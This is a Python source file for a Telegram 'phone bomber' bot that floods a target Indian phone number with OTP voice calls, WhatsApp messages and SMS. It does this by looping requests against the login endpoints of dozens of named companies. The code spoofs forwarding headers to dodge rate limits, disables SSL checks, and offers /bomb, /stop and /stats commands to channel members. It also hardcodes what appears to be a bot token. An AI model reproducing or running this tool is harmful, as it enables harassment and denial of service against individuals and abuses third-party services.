import os
import asyncio
import aiohttp
import time
import random
from colorama import Fore, Style
import threading
import json
from telegram import Update, ChatMember
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import sqlite3
from datetime import datetime

# Your original ULTIMATE_APIS list - copied exactly
ULTIMATE_APIS = [
    {
        "name": "Tata Capital Voice Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "1MG Voice Call", 
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Amazon Voice Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp"
    },
    {
        "name": "Paytm Voice Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Zomato Voice Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice"
    },
    {
        "name": "MakeMyTrip Voice Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Goibibo Voice Call",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Ola Voice Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Uber Voice Call",
        "url": "https://auth.uber.com/v2/voice-otp", 
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST", 
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
    },
    {
        "name": "Stratzy WhatsApp", 
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "name": "Jockey WhatsApp",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Rappi WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "name": "Eka Care WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "NoBroker SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "name": "PharmEasy SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Byju's SMS",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Meru Cab",
        "url": "https://merucabapp.com/api/otp/generate", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "Doubtnut",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST", 
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "Dayco India",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    {
        "name": "BeepKart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Lending Plate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobiles={phone}&resend=Resend"
    },
    {
        "name": "ShipRocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "NewMe",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
    },
    {
        "name": "Univest",
        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "CaratLane",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"contact_no":"{phone}"}}'
    },
    {
        "name": "ServeTel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "GoPink Cabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
    },
    {
        "name": "Shemaroome",
        "url": "https://www.shemaroome.com/users/resend_otp", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    },
    {
        "name": "Cossouq",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobilenumber={phone}&otptype=register"
    },
    {
        "name": "MyImagineStore",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile={phone}"
    },
    {
        "name": "Otpless",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'
    },
]

# Your original UltimatePhoneDestroyer class - copied exactly
class UltimatePhoneDestroyer:
    def __init__(self, user_id, phone):
        self.running = True
        self.user_id = user_id
        self.phone = phone
        self.stats = {
            "total_requests": 0,
            "successful_hits": 0,
            "failed_attempts": 0,
            "calls_sent": 0,
            "whatsapp_sent": 0,
            "sms_sent": 0,
            "start_time": time.time(),
            "active_apis": len(ULTIMATE_APIS)
        }
        
    async def bomb_phone(self, session, api, phone):
        while self.running:
            try:
                name = api["name"]
                url = api["url"](phone) if callable(api["url"]) else api["url"]
                headers = api["headers"].copy()
                
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                headers["Client-IP"] = headers["X-Forwarded-For"]
                headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
                
                self.stats["total_requests"] += 1
                
                if "call" in name.lower() or "voice" in name.lower():
                    attack_type = "CALL"
                    self.stats["calls_sent"] += 1
                    emoji = "📞"
                elif "whatsapp" in name.lower():
                    attack_type = "WHATSAPP"
                    self.stats["whatsapp_sent"] += 1
                    emoji = "📱"
                else:
                    attack_type = "SMS"
                    self.stats["sms_sent"] += 1
                    emoji = "💬"
                
                if api["method"] == "POST":
                    data = api["data"](phone) if api["data"] else None
                    async with session.post(url, headers=headers, data=data, timeout=3, ssl=False) as response:
                        if response.status in [200, 201, 202]:
                            self.stats["successful_hits"] += 1
                            print(f"{Fore.RED}[User:{self.user_id}] {emoji} {attack_type} HIT: {name} - SUCCESS! ({self.stats['successful_hits']}){Style.RESET_ALL}")
                        else:
                            self.stats["failed_attempts"] += 1
                            print(f"{Fore.YELLOW}[User:{self.user_id}] ⚠️ {attack_type}: {name} - Failed ({response.status}){Style.RESET_ALL}")
                else:
                    async with session.get(url, headers=headers, timeout=3, ssl=False) as response:
                        if response.status in [200, 201, 202]:
                            self.stats["successful_hits"] += 1
                            print(f"{Fore.RED}[User:{self.user_id}] {emoji} {attack_type} HIT: {name} - SUCCESS! ({self.stats['successful_hits']}){Style.RESET_ALL}")
                        else:
                            self.stats["failed_attempts"] += 1
                            print(f"{Fore.YELLOW}[User:{self.user_id}] ⚠️ {attack_type}: {name} - Failed ({response.status}){Style.RESET_ALL}")
                
                await asyncio.sleep(0.001)
                
            except Exception as e:
                self.stats["failed_attempts"] += 1
                continue
    
    async def start_destruction(self):
        print(f"\n{Fore.RED}[User:{self.user_id}] 🚀 STARTING ULTIMATE 900+ APIS BOMBER!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[User:{self.user_id}] 🎯 Target: +91{self.phone}{Style.RESET_ALL}")
        
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for api in ULTIMATE_APIS:
                task = asyncio.create_task(self.bomb_phone(session, api, self.phone))
                tasks.append(task)
            
            await asyncio.gather(*tasks, return_exceptions=True)
    
    def stop(self):
        self.running = False

# Database setup for multi-user
class UserManager:
    def __init__(self):
        self.conn = sqlite3.connect('users.db', check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        self.conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                joined_channel BOOLEAN DEFAULT FALSE,
                join_checked BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        self.conn.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                end_time TIMESTAMP,
                total_requests INTEGER DEFAULT 0,
                successful_hits INTEGER DEFAULT 0,
                FOREIGN KEY (user_id) REFERENCES users (user_id)
            )
        ''')
        self.conn.commit()
    
    def add_user(self, user_id, username, first_name):
        self.conn.execute(
            'INSERT OR REPLACE INTO users (user_id, username, first_name) VALUES (?, ?, ?)',
            (user_id, username, first_name)
        )
        self.conn.commit()
    
    def set_joined_channel(self, user_id, joined):
        self.conn.execute(
            'UPDATE users SET joined_channel = ?, join_checked = ? WHERE user_id = ?',
            (joined, True, user_id)
        )
        self.conn.commit()
    
    def has_joined_channel(self, user_id):
        cursor = self.conn.execute(
            'SELECT joined_channel FROM users WHERE user_id = ?', (user_id,)
        )
        result = cursor.fetchone()
        return result[0] if result else False
    
    def is_join_checked(self, user_id):
        cursor = self.conn.execute(
            'SELECT join_checked FROM users WHERE user_id = ?', (user_id,)
        )
        result = cursor.fetchone()
        return result[0] if result else False

# Bot Configuration
CHANNEL_USERNAME = "@technicalwhitehat"  # Change this to your channel
ADMIN_IDS = [1800946343]  # Add your admin user IDs here

# Global variables
user_manager = UserManager()
active_attacks = {}  # Format: {user_id: {phone: destroyer}}

async def is_user_member(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Check if user is member of the channel"""
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in [ChatMember.OWNER, ChatMember.ADMINISTRATOR, ChatMember.MEMBER]
    except:
        return False

async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Force user to join channel before using bot"""
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Add user to database
    user_manager.add_user(user_id, username, first_name)
    
    # Skip check for admins
    if user_id in ADMIN_IDS:
        user_manager.set_joined_channel(user_id, True)
        return True
    
    # Check if already verified
    if user_manager.is_join_checked(user_id) and user_manager.has_joined_channel(user_id):
        return True
    
    # Check channel membership
    is_member = await is_user_member(user_id, context)
    user_manager.set_joined_channel(user_id, is_member)
    
    if not is_member:
        await update.message.reply_text(
            f"🚫 *ACCESS DENIED!*\n\n"
            f"To use this bot, you must join our channel first:\n"
            f"{CHANNEL_USERNAME}\n\n"
            f"After joining, send /start again!",
            parse_mode='Markdown'
        )
        return False
    
    return True

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await force_join_check(update, context):
        return
    
    user_id = update.effective_user.id
    
    if user_id in ADMIN_IDS:
        admin_text = "👑 *ADMIN MODE* 👑"
    else:
        admin_text = ""
    
    await update.message.reply_text(
        f"💀 *ULTIMATE PHONE BOMBER BOT* 💀\n\n"
        f"{admin_text}\n"
        f"Welcome {update.effective_user.first_name}!\n\n"
        f"*Commands:*\n"
        f"/bomb <phone> - Start bombing\n"
        f"/stop <phone> - Stop bombing\n"
        f"/stats <phone> - Check stats\n"
        f"/myattacks - Show your active attacks\n"
        f"/allattacks - Show all active attacks (Admin)\n\n"
        f"*Example:* /bomb 1234567890\n\n"
        f"⚠️ Use at your own risk!",
        parse_mode='Markdown'
    )

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await force_join_check(update, context):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /bomb 1234567890")
        return
    
    phone = context.args[0]
    user_id = update.effective_user.id
    
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid phone! Must be 10 digits.")
        return
    
    # Initialize user attacks dict if not exists
    if user_id not in active_attacks:
        active_attacks[user_id] = {}
    
    if phone in active_attacks[user_id]:
        await update.message.reply_text(f"⚠️ Bombing already active for +91{phone}")
        return
    
    await update.message.reply_text(
        f"🚀 *STARTING BOMBING!*\n"
        f"👤 User: {update.effective_user.first_name}\n"
        f"📱 Target: +91{phone}\n"
        f"💣 APIs: {len(ULTIMATE_APIS)}\n\n"
        f"⚡ Destruction begins in 5 seconds...",
        parse_mode='Markdown'
    )
    
    destroyer = UltimatePhoneDestroyer(user_id, phone)
    active_attacks[user_id][phone] = destroyer
    
    # Start bombing in background
    asyncio.create_task(run_destruction(destroyer, user_id, phone, update))

async def run_destruction(destroyer, user_id, phone, update):
    try:
        await destroyer.start_destruction()
    except Exception as e:
        print(f"Error in destruction: {e}")
    finally:
        # Clean up when done
        if user_id in active_attacks and phone in active_attacks[user_id]:
            del active_attacks[user_id][phone]

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await force_join_check(update, context):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /stop 1234567890")
        return
    
    phone = context.args[0]
    user_id = update.effective_user.id
    
    # Admin can stop any attack
    if user_id in ADMIN_IDS:
        stopped = False
        for uid, attacks in active_attacks.items():
            if phone in attacks:
                attacks[phone].stop()
                del attacks[phone]
                stopped = True
        if stopped:
            await update.message.reply_text(f"🛑 *ADMIN: BOMBING STOPPED!*\n📱 Target: +91{phone}", parse_mode='Markdown')
        else:
            await update.message.reply_text(f"❌ No active bombing found for +91{phone}")
        return
    
    # Regular users can only stop their own attacks
    if user_id in active_attacks and phone in active_attacks[user_id]:
        active_attacks[user_id][phone].stop()
        del active_attacks[user_id][phone]
        await update.message.reply_text(f"🛑 *BOMBING STOPPED!*\n📱 Target: +91{phone}", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ No active bombing for +91{phone}")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await force_join_check(update, context):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /stats 1234567890")
        return
    
    phone = context.args[0]
    user_id = update.effective_user.id
    
    # Admin can check any attack
    if user_id in ADMIN_IDS:
        for uid, attacks in active_attacks.items():
            if phone in attacks:
                stats = attacks[phone].stats
                await send_stats_message(update, stats, phone)
                return
        await update.message.reply_text(f"❌ No active bombing found for +91{phone}")
        return
    
    # Regular users can only check their own attacks
    if user_id in active_attacks and phone in active_attacks[user_id]:
        stats = active_attacks[user_id][phone].stats
        await send_stats_message(update, stats, phone)
    else:
        await update.message.reply_text(f"❌ No active bombing for +91{phone}")

async def send_stats_message(update, stats, phone):
    elapsed = time.time() - stats["start_time"]
    success_rate = (stats["successful_hits"] / stats["total_requests"] * 100) if stats["total_requests"] > 0 else 0
    
    message = (
        f"📊 *REAL-TIME STATS*\n"
        f"📱 Target: +91{phone}\n"
        f"⏰ Time: {elapsed:.1f}s\n\n"
        f"📞 Calls: {stats['calls_sent']}\n"
        f"📱 WhatsApp: {stats['whatsapp_sent']}\n"
        f"💬 SMS: {stats['sms_sent']}\n"
        f"💥 Successful: {stats['successful_hits']}\n"
        f"🎯 Total: {stats['total_requests']}\n"
        f"📊 Rate: {success_rate:.1f}%\n\n"
    )
    
    if stats["successful_hits"] > 2000:
        message += "☠️ *PHONE COMPLETELY DEAD!*"
    elif stats["successful_hits"] > 1000:
        message += "🔥 *PHONE HANGING!*"
    elif stats["successful_hits"] > 500:
        message += "⚡ *PHONE SLOWING!*"
    else:
        message += "🎯 *BOMBING IN PROGRESS!*"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def myattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await force_join_check(update, context):
        return
    
    user_id = update.effective_user.id
    
    if user_id in active_attacks and active_attacks[user_id]:
        message = "🔫 *YOUR ACTIVE ATTACKS:*\n\n"
        for phone, destroyer in active_attacks[user_id].items():
            stats = destroyer.stats
            elapsed = time.time() - stats["start_time"]
            message += f"📱 +91{phone}\n⏰ {elapsed:.1f}s | 💥 {stats['successful_hits']} hits\n\n"
    else:
        message = "❌ No active attacks found!"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def allattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await force_join_check(update, context):
        return
    
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command!")
        return
    
    total_attacks = sum(len(attacks) for attacks in active_attacks.values())
    
    if total_attacks > 0:
        message = f"👑 *ADMIN - ALL ACTIVE ATTACKS:*\nTotal: {total_attacks}\n\n"
        
        for user_id, attacks in active_attacks.items():
            if attacks:
                message += f"👤 User ID: {user_id}\n"
                for phone, destroyer in attacks.items():
                    stats = destroyer.stats
                    elapsed = time.time() - stats["start_time"]
                    message += f"  📱 +91{phone} | ⏰ {elapsed:.1f}s | 💥 {stats['successful_hits']} hits\n"
                message += "\n"
    else:
        message = "❌ No active attacks running!"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await force_join_check(update, context):
        return
    
    await update.message.reply_text(
        "💀 *ULTIMATE BOMBER BOT*\n\n"
        "*Commands:*\n"
        "/bomb <phone> - Start bombing\n"
        "/stop <phone> - Stop bombing\n"
        "/stats <phone> - Check stats\n"
        "/myattacks - Show your attacks\n\n"
        "*Example:* /bomb 1234567890",
        parse_mode='Markdown'
    )

def main():
    TOKEN = "8545605385:AAEPBwsoxJ390NEXXyK6fpjlLGL9fc2rVAM"
    if not TOKEN:
        print("❌ Please set TELEGRAM_BOT_TOKEN environment variable")
        return
    
    app = Application.builder().token(TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("bomb", bomb_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("myattacks", myattacks_command))
    app.add_handler(CommandHandler("allattacks", allattacks_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 Multi-User Telegram Bomber Bot Started!")
    print(f"📢 Force join enabled for: {CHANNEL_USERNAME}")
    print("👑 Admin mode activated")
    
    app.run_polling()

if __name__ == '__main__':
    main()